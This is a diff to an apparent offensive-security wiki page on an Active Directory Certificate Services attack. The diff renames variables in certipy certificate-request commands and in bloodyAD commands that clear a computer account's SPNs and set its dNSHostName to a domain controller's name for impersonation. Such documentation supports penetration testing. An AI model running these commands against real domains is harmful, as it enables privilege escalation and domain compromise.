@@ -35,7 +35,7 @@ This check can be conducted using [Certipy](https://www.google.com/url?sa=t\&rct
 
 {% code overflow="wrap" %}
 ```bash
-certipy req -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User'
+certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'User'
 ```
 {% endcode %}
 
@@ -68,13 +68,13 @@ The [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python) tool can be us
 {% code overflow="wrap" %}
 ```bash
 # Clearing the SPNs
-bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' serviceprincipalname '[]'
+bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' serviceprincipalname '[]'
 
 # Setting the dNSHostName value to the name of a computer account to impersonate
-bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName '["$DC_NAME.$DOMAIN_FQDN"]'
+bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName '["$DC_NAME.$DOMAIN"]'
 
 # Verifying the dNSHostName value and SPN entries
-bloodyAD.py -d $DOMAIN_FQDN -u $USER_NAME -p $USER_PASSWORD --host $DC_IP getObjectAttributes 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName,serviceprincipalname
+bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP getObjectAttributes 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName,serviceprincipalname
 ```
 {% endcode %}
 
@@ -107,11 +107,8 @@ The third and last step consists in getting the certificate of the targeted mach
 {% tab title="UNIX-like" %}
 [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to request the certificate from UNIX-like systems.
 
-{% code overflow="wrap" %}
-```bash
-certipy req -u 'compter$'@'domain.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'Machine'
-```
-{% endcode %}
+<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>certipy req -u 'compter$'@"$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'Machine'
+</strong></code></pre>
 
 The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
 
